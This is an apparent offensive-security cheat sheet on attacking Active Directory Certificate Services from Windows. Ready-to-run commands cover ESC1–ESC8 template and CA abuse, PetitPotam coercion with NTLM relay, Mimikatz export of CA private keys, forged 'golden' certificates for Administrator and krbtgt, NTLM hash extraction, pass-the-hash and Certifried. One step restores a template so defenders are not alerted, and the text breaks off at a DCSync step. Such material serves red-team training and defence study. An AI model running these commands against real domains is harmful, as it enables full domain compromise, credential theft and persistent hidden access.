---
title: "AD CS Attacks — From Windows"
description: "Active Directory Certificate Services exploitation from Windows: ESC1-ESC8 with Certify, ForgeCert, Rubeus, and Pass-the-Certificate."
weight: 8
tags: ["active-directory", "adcs", "certificates", "certify", "forgecert", "rubeus", "windows", "pki"]
---

## Quick Reference

| ESC | Vulnerability | Tool | Requirement |
|-----|---------------|------|-------------|
| ESC1 | SAN in template | Certify + Rubeus | Enroll on template |
| ESC2 | Any Purpose EKU | Certify + Rubeus | Enroll on template |
| ESC3 | Enrollment Agent | Certify x2 + Rubeus | Agent cert + 2nd enroll |
| ESC4 | Template write access | PowerView + Certify | GenericWrite on template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | Certify + Rubeus | Any enroll |
| ESC7 | CA Officer / Manage | Certify ca | ManageCA or ManageCertificates |
| ESC8 | NTLM relay to certsrv | ntlmrelayx (from Kali) | Coercion + web enrollment |

---

## AD CS Fundamentals

Active Directory Certificate Services (AD CS) is Microsoft's PKI implementation, used to issue digital certificates for authentication, encryption, and code signing within a Windows domain. It is high-value from an attacker's perspective because:

- Certificates can be used for **Kerberos PKINIT authentication** (bypasses password requirement)
- Certificates survive **password resets** — a cert remains valid until expiration even if the account password changes
- Misconfigurations in templates or CA settings are common and often overlooked
- A compromised CA private key enables **forging certificates for any user indefinitely**

### Certificate Template Flags That Matter

The `msPKI-Certificate-Name-Flag` attribute on a template controls what the enrollee can specify during a request:

| Flag | Hex Value | Meaning |
|------|-----------|---------|
| `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | `0x00000001` | Enrollee can specify Subject and SAN — core ESC1 condition |
| `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` | `0x00010000` | Enrollee can specify SAN only |
| `CT_FLAG_NO_SECURITY_EXTENSION` | `0x00080000` | No szOID_NTDS_CA_SECURITY_EXT embedded — ESC9 condition |

The `msPKI-Enrollment-Flag` controls enrollment behavior:

| Flag | Hex Value | Meaning |
|------|-----------|---------|
| `CT_FLAG_PEND_ALL_REQUESTS` | `0x00000002` | All requests require manager approval — **mitigates ESC1** |
| `EDITF_ATTRIBUTESUBJECTALTNAME2` | CA-level flag | CA accepts SAN from any request — ESC6 condition |

### EKU Values Relevant to Attacks

Extended Key Usages (EKUs) define what a certificate can be used for. These are the critical ones:

| OID | Name | Significance |
|-----|------|-------------|
| `1.3.6.1.5.5.7.3.2` | Client Authentication | Required for PKINIT (Kerberos with cert) |
| `1.3.6.1.5.5.7.3.1` | Server Authentication | TLS server cert |
| `1.3.6.1.4.1.311.20.2.1` | Certificate Request Agent | Enrollment Agent — ESC3 condition |
| `2.5.29.37.0` | Any Purpose | Can be used for any purpose including auth — ESC2 condition |
| (empty) | SubCA | No EKU = can be used for anything — treated as Any Purpose |

For PKINIT to succeed, the certificate **must** include the Client Authentication EKU (`1.3.6.1.5.5.7.3.2`) or have no EKU restriction (SubCA / Any Purpose).

### Certificate Request Flow

1. Client sends a Certificate Signing Request (CSR) to the CA
2. CA checks enrollment permissions on the requested template
3. CA checks whether the template allows SAN or subject to be supplied by enrollee
4. If `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set, the CA accepts whatever SAN the client sends
5. CA issues the certificate
6. Attacker uses cert → Rubeus `asktgt` → TGT issued by DC → inject ticket → lateral movement

---

## Tools Setup

```
# Certify.exe — enumerate CA and certificate templates, request certificates
# Download: https://github.com/GhostPack/Certify
# Must be compiled from source or obtained from a trusted build

# ForgeCert.exe — forge certificates from CA certificate + private key (offline)
# Download: https://github.com/GhostPack/ForgeCert
# Requires CA .pfx (cert + key)

# Rubeus.exe — Kerberos toolkit; used to convert cert to TGT via PKINIT
# Download: https://github.com/GhostPack/Rubeus
# Key command: asktgt /certificate:...
```

These tools require compilation from the GhostPack source repositories. Pre-compiled binaries are available from trusted repositories such as SharpCollection (for lab/assessment use only).

Place binaries in a writable directory:

```
mkdir C:\Temp\tools
copy Certify.exe C:\Temp\tools\
copy Rubeus.exe C:\Temp\tools\
copy ForgeCert.exe C:\Temp\tools\
```

---

## Enumeration with Certify

> **Required privileges:** Any domain user account is sufficient for enumeration.

### Full Enumeration

```
# Find all CAs and all certificate templates in the domain
Certify.exe find

# Find only templates that are vulnerable to known ESC attacks
Certify.exe find /vulnerable

# Find templates where the current user has enrollment rights and Client Authentication EKU
Certify.exe find /clientauth

# Get detailed CA information only
Certify.exe cas

# Scope enumeration to a specific CA
Certify.exe find /ca:CA_HOSTNAME\CA_NAME
```

### Interpreting Certify Output

Key indicators in `Certify.exe find /vulnerable` output:

```
[!] Vulnerable Certificate Templates :

    CA Name                         : CA_HOSTNAME\CA_NAME
    Template Name                   : TEMPLATE_NAME
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificate-Name-Flag     : ENROLLEE_SUPPLIES_SUBJECT      <-- ESC1
    msPKI-Enrollment-Flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication           <-- PKINIT usable
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TARGET_DOMAIN\Domain Users      <-- any user can enroll
```

What each field means:

- `ENROLLEE_SUPPLIES_SUBJECT` in `msPKI-Certificate-Name-Flag` → the enrollee controls the SAN → **ESC1**
- `Client Authentication` in `pkiextendedkeyusage` → certificate can authenticate via Kerberos PKINIT
- `Domain Users` in Enrollment Rights → any domain user can request this template
- `Authorized Signatures Required: 0` → no enrollment agent signature needed
- `PEND_ALL_REQUESTS` in `msPKI-Enrollment-Flag` → requests need approval → ESC1 **not directly exploitable**

### CA Flags Check (ESC6)

```
Certify.exe cas
```

Look for:

```
[!] CA Flags:
    EDITF_ATTRIBUTESUBJECTALTNAME2 set!   <-- ESC6: any template with Client Auth becomes ESC1-vulnerable
```

---

## ESC1 — Subject Alternative Name Abuse

**Vulnerability:** Template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set, includes `Client Authentication` EKU, and low-privilege users (e.g., Domain Users) can enroll.

> **Required privileges:** Any account with enrollment rights on the vulnerable template (typically Domain Users).

### Step 1: Confirm Vulnerability

```
Certify.exe find /vulnerable
```

Verify:
- `msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT`
- `pkiextendedkeyusage: Client Authentication`
- `Enrollment Rights: TARGET_DOMAIN\Domain Users` (or your group)
- `Authorized Signatures Required: 0`
- `msPKI-Enrollment-Flag` does NOT contain `PEND_ALL_REQUESTS`

### Step 2: Request Certificate with Arbitrary SAN

```
# Request a certificate specifying Administrator as the Subject Alternative Name
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:TEMPLATE_NAME /altname:Administrator
```

Certify outputs the certificate in PEM format (base64-encoded, between `-----BEGIN RSA PRIVATE KEY-----` and `-----END CERTIFICATE-----` blocks). Save the entire output block to a file called `cert.pem`.

### Step 3: Convert PEM to PFX

The PEM output from Certify contains both the private key and the certificate. Convert to PFX for use with Rubeus.

**Option A — certutil (Windows, available by default):**

```
certutil -MergePFX cert.pem cert.pfx
```

This will prompt for a password for the PFX. Use a simple password like `pass123` for the session.

**Option B — openssl (on Kali or Windows with openssl installed):**

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Enter export password when prompted.

**Option C — PowerShell (certificate import method):**

```powershell
# Read PEM file and convert via .NET
$pemContent = Get-Content -Raw "C:\Temp\cert.pem"
# This method is limited; prefer certutil or openssl for reliable PFX conversion
```

### Step 4: Use Certificate to Get TGT

```
# Pass-the-Certificate: use PFX file
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\cert.pfx /password:pass123 /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

# Pass-the-Certificate: use base64-encoded certificate string directly
# (copy the base64 blob from Certify output, remove whitespace)
Rubeus.exe asktgt /user:Administrator /certificate:BASE64CERTSTRING /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt
```

The `/ptt` flag injects the resulting TGT into the current logon session.

### Step 5: Verify Access

```
# List cached Kerberos tickets
klist

# Test access to DC share (should work if TGT injected successfully)
dir \\DC_HOSTNAME\C$

# Access SYSVOL
dir \\DC_HOSTNAME\SYSVOL

# Run commands on DC via PSExec or WMI
# (requires separate tooling — ticket is injected, standard Windows auth flows work)
```

> **Note:** Certify outputs certificates in base64 PEM format. Rubeus accepts base64 directly with `/certificate:BASE64STRING` — remove all whitespace and newlines from the base64 block before passing it.

---

## ESC2 — Any Purpose EKU

**Vulnerability:** Template has `Any Purpose` EKU (`2.5.29.37.0`) or is a SubCA template (no EKU at all). Such certificates can be used for any purpose, including as an enrollment agent to request certificates on behalf of other users.

> **Required privileges:** Any account with enrollment rights on the vulnerable template.

### Step 1: Identify Vulnerable Template

```
Certify.exe find /vulnerable
```

Look for:

```
pkiextendedkeyusage             : Any Purpose
# or
pkiextendedkeyusage             : (empty)    <-- SubCA template, no EKU restriction
```

### Step 2: Request Certificate

```
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:ESC2_TEMPLATE_NAME
```

Convert output to PFX as described in ESC1 Step 3.

### Step 3: Authenticate with Certificate

If the template allows direct Client Authentication (via Any Purpose):

```
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt
```

If using it as an enrollment agent (SubCA / Any Purpose cert acting as agent):

Proceed to the ESC3 second-step flow — use this certificate as the enrollment agent cert to request on behalf of another user.

---

## ESC3 — Enrollment Agent Abuse

**Vulnerability:** Two templates are abused in sequence:
- **Template A:** Has `Certificate Request Agent` EKU (`1.3.6.1.4.1.311.20.2.1`) — allows enrolling on behalf of others
- **Template B:** Allows enrollment agents to enroll on behalf of another user

> **Required privileges:** Enrollment rights on Template A and Template B.

### Step 1: Identify Enrollment Agent Template

```
Certify.exe find /vulnerable
```

Look for a template with:

```
pkiextendedkeyusage: Certificate Request Agent
```

Note the template name — this is your enrollment agent template.

Also identify a second template that permits enrollment on behalf of others (check `Application Policies` or `Issuance Requirements` fields in Certify output showing `Authorized Signatures Required >= 1` from an agent).

### Step 2: Request Enrollment Agent Certificate

```
# Request a Certificate Request Agent cert from Template A
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:ENROLLMENT_AGENT_TEMPLATE
```

Convert output PEM to PFX:

```
certutil -MergePFX agent.pem agent.pfx
```

### Step 3: Enroll on Behalf of Administrator

```
# Use the enrollment agent cert to request on behalf of Administrator from Template B
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:USER_TEMPLATE /onbehalfof:TARGET_DOMAIN\Administrator /enrollcert:agent.pfx /enrollcertpw:CERT_PASS
```

The `/onbehalfof` flag instructs Certify to generate a request where the certificate subject will be the target user (Administrator), signed by your enrollment agent certificate.

Save resulting PEM output as `administrator.pem`, then convert:

```
certutil -MergePFX administrator.pem administrator.pfx
```

### Step 4: Authenticate as Administrator

```
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\administrator.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt
```

```
klist
dir \\DC_HOSTNAME\C$
```

---

## ESC4 — Template Write Access

**Vulnerability:** Current user has write permissions on a certificate template AD object (`GenericWrite`, `WriteProperty`, `WriteDACL`, or `WriteOwner`). This allows modifying the template to introduce ESC1 conditions, then exploiting it.

> **Required privileges:** GenericWrite or WriteDACL on the target certificate template object in Active Directory.

### Step 1: Identify Templates with Write Access

```powershell
# Import PowerView
Import-Module C:\Temp\PowerView.ps1

# Build the distinguished name for the template
$templateDN = "CN=TEMPLATE_NAME,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=TARGET_DOMAIN,DC=com"

# Check ACEs on the template object
Get-DomainObjectAcl -ADSpath $templateDN -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty|WriteDACL|WriteOwner|GenericAll"
} | Select-Object SecurityIdentifier, ActiveDirectoryRights, AceType
```

Match the SID in the output against your current user:

```powershell
# Get your current user's SID
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
```

### Step 2: Save Original Template Flag

```powershell
# Import AD module (if available) or use ADSI
$templateObj = Get-ADObject "CN=TEMPLATE_NAME,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=TARGET_DOMAIN,DC=com" -Properties msPKI-Certificate-Name-Flag

# Store the original value — critical for cleanup
$originalFlag = $templateObj.'msPKI-Certificate-Name-Flag'
Write-Host "Original msPKI-Certificate-Name-Flag: $originalFlag"
```

### Step 3: Enable ENROLLEE_SUPPLIES_SUBJECT on Template

```powershell
# Add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1) to the flag using bitwise OR
$newFlag = $originalFlag -bor 0x00000001
Set-ADObject $templateObj -Replace @{'msPKI-Certificate-Name-Flag' = $newFlag}

# Confirm change
Get-ADObject "CN=TEMPLATE_NAME,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=TARGET_DOMAIN,DC=com" -Properties msPKI-Certificate-Name-Flag | Select-Object 'msPKI-Certificate-Name-Flag'
```

Allow a brief propagation delay (10-30 seconds) before requesting:

```powershell
Start-Sleep -Seconds 15
```

### Step 4: Request Certificate with Arbitrary SAN

```
# Now the template is ESC1-vulnerable — request with SAN
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:TEMPLATE_NAME /altname:Administrator
```

Convert PEM output to PFX:

```
certutil -MergePFX cert.pem cert.pfx
```

### Step 5: Restore Original Template Value

**This step is critical** — leaving the template modified is noisy and may alert defenders.

```powershell
# Restore original flag value
Set-ADObject $templateObj -Replace @{'msPKI-Certificate-Name-Flag' = $originalFlag}

# Confirm restoration
Get-ADObject "CN=TEMPLATE_NAME,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=TARGET_DOMAIN,DC=com" -Properties msPKI-Certificate-Name-Flag | Select-Object 'msPKI-Certificate-Name-Flag'
```

### Step 6: Authenticate with Certificate

```
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

klist
dir \\DC_HOSTNAME\C$
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

**Vulnerability:** The CA is configured with the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, which causes the CA to honor SAN values specified in any certificate request — regardless of whether the template allows it. This effectively makes every template with `Client Authentication` EKU ESC1-exploitable.

> **Required privileges:** Any account with enrollment rights on any template that has Client Authentication EKU.

### Step 1: Confirm the Flag is Set

```
Certify.exe cas
```

Look in output for:

```
[!] EDITF_ATTRIBUTESUBJECTALTNAME2 is set on the CA!
```

Also visible in:

```
Certify.exe find /vulnerable
```

### Step 2: Find Any Enrollable Template with Client Auth

```
Certify.exe find /clientauth
```

The built-in `User` template almost always has `Client Authentication` and allows Domain Users to enroll. Use it directly:

### Step 3: Request Certificate with Arbitrary SAN

```
# Use built-in User template — the CA flag allows SAN override on any template
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:User /altname:Administrator
```

```
# Or explicitly specify SAN with any other Client Auth template
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:TEMPLATE_NAME /altname:Administrator@TARGET_DOMAIN
```

Convert PEM output to PFX:

```
certutil -MergePFX cert.pem cert.pfx
```

### Step 4: Authenticate

```
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

klist
dir \\DC_HOSTNAME\C$
```

---

## ESC7 — CA Officer / Manage CA Abuse

**Vulnerability:** Current user has `Manage CA` (CA administrator) or `Manage Certificates` (CA officer) rights on the CA. These rights allow enabling templates and issuing/approving pending certificate requests.

> **Required privileges:** `Manage CA` rights on the target CA, or `Manage Certificates` rights (the latter is needed to approve requests).

### Step 1: Enumerate CA Permissions

```
Certify.exe cas
```

Look for your user or group in the CA access control output:

```
CA Permissions:
  Owner: TARGET_DOMAIN\CA-Admins
  Access Rights:

    Principal              Rights
    ─────────────────      ──────
    NT AUTHORITY\System    ManageCA, Enroll
    TARGET_DOMAIN\Domain Admins  ManageCA, Enroll
    TARGET_DOMAIN\USERNAME       ManageCA             <-- you have ManageCA
```

### Step 2: Enable the SubCA Template on the CA

The SubCA template is not enabled by default, but with `Manage CA` you can enable it:

```
Certify.exe ca /ca:CA_HOSTNAME\CA_NAME /enable-template:SubCA
```

Confirm it appears in Certify's template list:

```
Certify.exe find
```

### Step 3: Request a SubCA Certificate (Will Be Denied)

```
# Request SubCA cert with Administrator as SAN
# This request will FAIL (denied) because SubCA template requires manager approval
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:SubCA /altname:Administrator
```

**Note the Request ID** from the output — you will need it in the next step. It appears as:

```
[*] Request ID: 12
```

### Step 4: Approve the Pending Request

With `Manage Certificates` permission, you can issue the denied request:

```
# Approve and issue the request using the request ID from Step 3
Certify.exe ca /ca:CA_HOSTNAME\CA_NAME /issue-request:12
```

If you only have `Manage CA` (not `Manage Certificates`), you can grant yourself `Manage Certificates` first:

```
# Add ManageCertificates right to your account (requires ManageCA)
Certify.exe ca /ca:CA_HOSTNAME\CA_NAME /addofficer:USERNAME
```

Then issue the request:

```
Certify.exe ca /ca:CA_HOSTNAME\CA_NAME /issue-request:12
```

### Step 5: Download the Issued Certificate

```
# Retrieve the now-issued certificate by request ID
Certify.exe download /ca:CA_HOSTNAME\CA_NAME /request-id:12
```

This outputs the certificate in PEM format. Convert to PFX:

```
certutil -MergePFX administrator.pem administrator.pfx
```

### Step 6: Authenticate with Forged SubCA Certificate

```
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\administrator.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

klist
dir \\DC_HOSTNAME\C$
```

---

## ESC8 — NTLM Relay to AD CS HTTP Enrollment

**Vulnerability:** AD CS web enrollment interface (`http://CA_HOSTNAME/certsrv`) accepts NTLM authentication and does not enforce HTTPS or EPA (Extended Protection for Authentication). An attacker can coerce a machine account (or user) to authenticate, relay the credentials to the CA's web enrollment endpoint, and obtain a certificate for that account.

> **Required privileges:** Network access to CA web enrollment endpoint. Ability to coerce authentication from a target (e.g., via PetitPotam, PrintSpooler, or other coercion).

> **Note:** ESC8 is primarily executed from Kali Linux using `ntlmrelayx.py` and a coercion tool. The Windows foothold is used for coercion. This is documented here for completeness.

### Step 1: Verify Web Enrollment is Available

```powershell
# Check if certsrv web enrollment is reachable
Invoke-WebRequest -Uri "http://CA_HOSTNAME/certsrv/" -UseDefaultCredentials
```

Or simply browse to `http://CA_HOSTNAME/certsrv/` from a browser on the Windows foothold to confirm the service is running.

### Step 2: Coerce Authentication from DC (from Windows foothold)

Use PetitPotam (Windows port) or Coercer to force DC_HOSTNAME to authenticate to your attack machine:

```
# PetitPotam (unauthenticated variant — targets EFSRPC)
PetitPotam.exe KALI_IP DC_HOSTNAME

# With authentication (authenticated variant)
PetitPotam.exe -u USERNAME -p PASSWORD -d TARGET_DOMAIN KALI_IP DC_HOSTNAME
```

Replace `KALI_IP` with your Kali machine's IP address.

### Step 3: Relay on Kali (from Linux)

On the Kali machine, `ntlmrelayx.py` listens for the incoming authentication and relays it to the AD CS web enrollment endpoint to request a certificate for the relayed account:

```bash
# On Kali — relay to certsrv and request a certificate for the DC machine account
python3 ntlmrelayx.py -t http://CA_HOSTNAME/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

When the relay succeeds, `ntlmrelayx.py` outputs a base64-encoded certificate for the DC machine account.

### Step 4: Use Certificate (from Kali or Windows)

From Windows, if you have the base64 cert:

```
# Use Rubeus with the base64 certificate string received from ntlmrelayx
Rubeus.exe asktgt /user:DC_HOSTNAME$ /certificate:BASE64CERTSTRING /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt
```

Note the `$` suffix on the machine account name. A TGT for the DC machine account (`DC_HOSTNAME$`) can be used for DCSync or other DC-level operations.

---

## Pass-the-Certificate with Rubeus

Rubeus `asktgt` is the primary tool for converting a certificate (obtained via any ESC) into a Kerberos TGT via PKINIT.

### Full Syntax Reference

```
# Standard PFX file on disk
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

# PFX file — inject ticket AND display it
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt /show

# Base64 certificate string directly (no file — from Certify output, whitespace removed)
Rubeus.exe asktgt /user:USERNAME /certificate:BASE64CERTSTRING /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

# Request TGT without injection (save to .kirbi file)
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /outfile:C:\Temp\admin.kirbi

# Retrieve NTLM hash from certificate via PKINIT + U2U (shadow credentials technique)
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /getcredentials /show

# Force AES256 encryption type
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /enctype:aes256 /ptt
```

### Extracting NTLM Hash from Certificate

The `/getcredentials` flag uses PKINIT + User-to-User (U2U) Kerberos to retrieve the NTLM hash of the target account. This is useful when you want to perform Pass-the-Hash instead of Pass-the-Ticket:

```
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /getcredentials /show
```

Output includes:

```
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : NTLM_HASH
```

Use the extracted NTLM hash:

```
# Pass-the-Hash with extracted NTLM (using Mimikatz sekurlsa::pth or Invoke-TheHash)
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe" exit
```

### Troubleshooting Pass-the-Certificate

| Error | Likely Cause | Fix |
|-------|-------------|-----|
| `KDC_ERR_PADATA_TYPE_NOSUPP` | DC does not support PKINIT or cert has wrong EKU | Ensure cert has Client Authentication EKU; confirm PKINIT enabled |
| `KDC_ERR_CLIENT_NAME_MISMATCH` | Username in /user does not match cert SAN | Ensure `/user` matches the SAN exactly |
| `KRB_AP_ERR_SKEW` | Clock skew > 5 minutes | Sync time with DC: `w32tm /resync` or `net time \\DC_HOSTNAME /set /yes` |
| `Certificate not found` | PFX file path wrong or cert corrupt | Verify path; re-convert PEM to PFX |
| `Access denied on import` | PFX password incorrect | Re-convert with known password |

---

## ForgeCert — Forge Arbitrary Certificates from CA Key

**Requirement:** CA certificate and CA private key, extracted from the CA server. This typically requires local administrator access on the CA server (which is often a Domain Admin-level compromise).

> **Required privileges:** Local administrator on the CA server to extract the CA private key.

### Step 1: Extract CA Certificate and Private Key

**Option A — certutil (on CA server):**

```
# Export CA cert to file (public cert only, no key)
certutil -ca.cert C:\Temp\ca.cer

# List CA certificates in the personal store
certutil -store My
```

For the private key, you need to export from the certificate store with the private key.

**Option B — Mimikatz (on CA server):**

```
# Export all certificates from the machine store including private keys
mimikatz.exe "crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export" exit

# Export private keys from CAPI (Cryptographic API)
mimikatz.exe "crypto::keys /export" exit
```

Mimikatz will produce `.pfx` and `.pvk` files in the current directory.

**Option C — SharpDPAPI / Seatbelt (to locate CA key material):**

```
# SharpDPAPI to locate exportable cert keys
SharpDPAPI.exe certificates /machine
```

The CA certificate + key will be in a single `.pfx` file. Note the password Mimikatz sets on the export (shown in output).

### Step 2: Verify CA Certificate

```
# Verify the exported CA cert on your Windows foothold
certutil -dump ca.pfx
```

Confirm the `Subject` matches the actual CA name and that it shows `Private key is NOT exportable` is NOT listed (meaning the private key is present).

### Step 3: Forge Certificate for Target User

```
# Forge a certificate as Administrator
ForgeCert.exe --CaCertPath C:\Temp\ca.pfx --CaCertPassword CERT_PASS --Subject "CN=Administrator" --SubjectAltName Administrator@TARGET_DOMAIN --NewCertPath C:\Temp\forged_admin.pfx --NewCertPassword FORGED_PASS

# Forge a certificate for any user by specifying UPN in SubjectAltName
ForgeCert.exe --CaCertPath C:\Temp\ca.pfx --CaCertPassword CERT_PASS --Subject "CN=krbtgt" --SubjectAltName krbtgt@TARGET_DOMAIN --NewCertPath C:\Temp\forged_krbtgt.pfx --NewCertPassword FORGED_PASS
```

ForgeCert parameters:

| Parameter | Description |
|-----------|------------|
| `--CaCertPath` | Path to the CA .pfx file (cert + private key) |
| `--CaCertPassword` | Password for the CA .pfx |
| `--Subject` | Certificate subject (CN= field) |
| `--SubjectAltName` | UPN in SAN — must match the target account's UPN |
| `--NewCertPath` | Output path for the forged certificate .pfx |
| `--NewCertPassword` | Password to set on the output .pfx |

### Step 4: Authenticate with Forged Certificate

```
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\forged_admin.pfx /password:FORGED_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

klist
dir \\DC_HOSTNAME\C$
```

### Why This is a "Golden Certificate"

The forged certificate is signed by the actual CA private key. The DC cannot distinguish it from a legitimately issued certificate. This gives the attacker:

- Authentication as **any user** in the domain, at any time
- Persistence that **survives password resets** (cert-based auth, not password-based)
- Persistence valid for the **lifetime of the CA** (often 5-10+ years)
- No certificate request logged in the CA database (forgery is offline)

Remediation requires rotating the CA key and potentially replacing the entire PKI infrastructure.

---

## Certificate Persistence

### Why Certificates Persist

| Factor | Detail |
|--------|--------|
| Cert validity period | Typically 1 year for user templates; up to 5+ years for custom templates |
| Password change | Does NOT invalidate a certificate — cert-based auth is independent of password |
| Account lockout | Cert-based PKINIT still works during temporary lockout (depends on implementation) |
| Account deletion | Cert becomes invalid only after account deletion (or explicit revocation) |

### Checking Certificate Expiration

```powershell
# Check a PFX cert's validity period
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("C:\Temp\cert.pfx", "CERT_PASS")
Write-Host "Subject: $($cert.Subject)"
Write-Host "SAN: $(($cert.Extensions | Where-Object {$_.Oid.Value -eq '2.5.29.17'}).Format($true))"
Write-Host "Valid From: $($cert.NotBefore)"
Write-Host "Valid Until: $($cert.NotAfter)"
Write-Host "Issuer: $($cert.Issuer)"
```

### Certificate Revocation

If defenders try to revoke a compromised certificate, check whether OCSP or CRL checking is enforced. In many environments it is not validated strictly:

```
# List revoked certificates on the CA (requires CA management tools)
certutil -view -restrict "Disposition=21" -out "RequestID,RequesterName,NotAfter,SerialNumber" csv
```

### Storing Certificates Securely

```
# Import certificate into the current user's personal certificate store
Import-PfxCertificate -FilePath C:\Temp\cert.pfx -CertStoreLocation Cert:\CurrentUser\My -Password (ConvertTo-SecureString "CERT_PASS" -AsPlainText -Force)

# List certs in personal store
Get-ChildItem Cert:\CurrentUser\My | Select-Object Subject, NotAfter, Thumbprint

# Export a certificate from the store by thumbprint
$thumb = "CERT_THUMBPRINT"
Export-PfxCertificate -Cert "Cert:\CurrentUser\My\$thumb" -FilePath C:\Temp\backup.pfx -Password (ConvertTo-SecureString "CERT_PASS" -AsPlainText -Force)
```

---

## Certifried — CVE-2022-26923

**Vulnerability:** Patched in May 2022 (KB5014754). Machine accounts can set their `dNSHostName` attribute to match a DC, causing the CA to issue a certificate that impersonates the DC. PKINIT with that certificate results in a TGT for the DC machine account, enabling DCSync.

> **Required privileges:** GenericWrite on a computer account, or ability to create a new machine account (by default, domain users can create up to 10 machine accounts via `ms-DS-MachineAccountQuota`).

### Step 1: Create or Identify a Controllable Machine Account

```powershell
# Add a new machine account (uses ms-DS-MachineAccountQuota allowance)
# Requires PowerMad module
Import-Module C:\Temp\Powermad.ps1

New-MachineAccount -MachineAccount FAKE_COMPUTER -Password (ConvertTo-SecureString "Pass@1234" -AsPlainText -Force)
```

### Step 2: Set dNSHostName to Impersonate DC

Certipy handles this from Kali, but the equivalent Windows-side manipulation via AD module:

```powershell
# Set the dNSHostName attribute of the machine account to match the DC
Set-ADComputer FAKE_COMPUTER -DNSHostName "DC_HOSTNAME.TARGET_DOMAIN"

# Verify
Get-ADComputer FAKE_COMPUTER -Properties dNSHostName | Select-Object dNSHostName
```

### Step 3: Request Machine Certificate

```
# Request a computer certificate on behalf of the machine account
# Template: Machine or Computer (standard machine certificate template)
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:Machine /machine
```

The issued certificate will have the SAN set to `DC_HOSTNAME.TARGET_DOMAIN` due to the spoofed `dNSHostName`.

### Step 4: Authenticate as DC Machine Account

```
# Convert PEM to PFX
certutil -MergePFX machine.pem machine.pfx

# Request TGT as DC machine account using the impersonation cert
Rubeus.exe asktgt /user:DC_HOSTNAME$ /certificate:C:\Temp\machine.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

# Get credentials (NTLM) from the TGT
Rubeus.exe asktgt /user:DC_HOSTNAME$ /certificate:C:\Temp\machine.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /getcredentials /show
```

### Step 5: DCSync with DC Machine Account

With a TGT for the DC machine account or its NTLM hash:

```
# DCSync using mimikatz with injected ticket
